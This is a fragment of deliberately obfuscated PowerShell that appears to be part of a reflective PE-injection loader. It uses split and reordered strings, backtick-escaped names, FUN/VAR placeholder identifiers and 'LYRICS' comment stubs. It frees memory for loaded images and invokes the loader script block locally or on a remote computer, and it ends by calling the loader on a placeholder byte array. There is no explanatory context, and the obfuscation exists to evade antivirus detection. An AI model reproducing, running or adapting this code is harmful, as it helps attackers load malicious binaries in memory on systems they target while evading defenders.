                if ( (  $VAR0301 -eq $null) -or (  $VAR0301 -eq $VAR095::"Z`eRo")) {
# LYRICS1119
                    Throw ( "{0}{1}" -f 'ERRO','R71'  )
                }
# LYRICS1120
                $VAR0301  =    & ( "{2}{0}{1}" -f '0','04','FUN'  ) $VAR0301 $VAR0263
# LYRICS1121
                $VAR0301   = & (  "{0}{1}" -f'FU','N005'  ) $VAR0301 $VAR0292
# LYRICS1122
# LYRICS1123
# LYRICS1124
                $Null   =  &  (  "{0}{1}" -f'F','UN014'  ) -VAR0151 $VAR0161 -VAR0127 $VAR0301 -VAR0042 $VAR0042
            }
# LYRICS1125
# LYRICS1126
# LYRICS1127
            if (  $VAR0161 -eq $VAR095::"ZE`Ro" -and $VAR0126."CONs`T037" -ieq ( "{1}{0}"-f 'y','Librar' )) {
# LYRICS1128
                 &("{0}{1}{2}"-f 'FU','N','029') -VAR0263 $VAR0263
            }
            else {
# LYRICS1129
# LYRICS1130
                $Success  = $VAR0042."FUN038"."inV`Oke"(  $VAR0263, [UInt64]0, $VAR0041."COn`st025"  )
# LYRICS1131
            }
# LYRICS1132
        }
# LYRICS1133
         &  ("{1}{0}" -f'UN030','F' )
    }
# LYRICS1134
# LYRICS1135
    Function f`UN030 {
# LYRICS1136
# LYRICS1137
# LYRICS1138
        if (  -not $VAR008  ) {
# LYRICS1139
# LYRICS1140
            $VAR001[0]   =  0
# LYRICS1141
            $VAR001[1]   =  0
        }
# LYRICS1142
# LYRICS1143
        if ($VAR004 -ne $null -and $VAR004 -ne '') {
# LYRICS1144
            $VAR004 =   ( 'VAR030'  +  '5 ' + "$VAR004" )
        }
        else {
            $VAR004 =   (  "{0}{1}{2}" -f 'VA','R0','305')
        }
# LYRICS1145
        if ($VAR002 -eq $null -or $VAR002 -imatch "^\s*$") {
# LYRICS1146
             &  (  "{2}{0}{1}{3}"-f'e-Comm','an','Invok','d') -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004  )
# LYRICS1147
        }
        else {
# LYRICS1148
             & ( "{0}{2}{3}{1}"-f 'In','d','voke-C','omman') -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004) -VAR002 $VAR002
# LYRICS1149
        }
    }
# LYRICS1150
      &  ( "{0}{1}" -f'F','UN030' )
}



$Bytes   =   QWERQWERQWER
& (  "{1}{0}" -f'0','FUN00' ) -VAR001 $Bytes


"""